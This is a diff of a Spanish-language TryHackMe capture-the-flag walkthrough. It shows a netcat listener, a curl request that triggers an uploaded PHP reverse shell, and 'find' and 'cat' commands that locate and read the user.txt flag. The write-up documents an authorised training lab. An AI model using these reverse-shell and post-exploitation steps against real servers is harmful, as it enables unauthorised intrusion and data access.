@@ -46,3 +46,23 @@ nc -nlvp 9999 (puerto especificado en el .php5)
 terminal 2: 
 curl http://$IP/uploads_reverse_shell.php5
 
+Tenemos una shell!!
+
+![image](https://user-images.githubusercontent.com/44788583/202302116-12ea2164-cd71-410f-acf3-9c9aef0a3474.png)
+
+
+ya que tenemos una shell, la pista en tryhackme nos dice que busquemos el archivo user.txt
+
+
+lo podemos buscar con el comando find ./ -name user.txt y lo buscamos en todo el servidor. 
+![image](https://user-images.githubusercontent.com/44788583/202302445-b7a64194-eb1f-44a3-b8bf-829be7727863.png)
+
+![image](https://user-images.githubusercontent.com/44788583/202302522-c50eecaa-7daa-4260-a971-3f78779c47b0.png)
+
+Ahora que sabemos que esta en /var/www/user.txt podemor ir a ver el contenido de esa flag con cat /var/www/user.txt
+
+![image](https://user-images.githubusercontent.com/44788583/202302777-8b935d64-8ad3-4e70-9af1-4b536681825c.png)
+
+
+
+
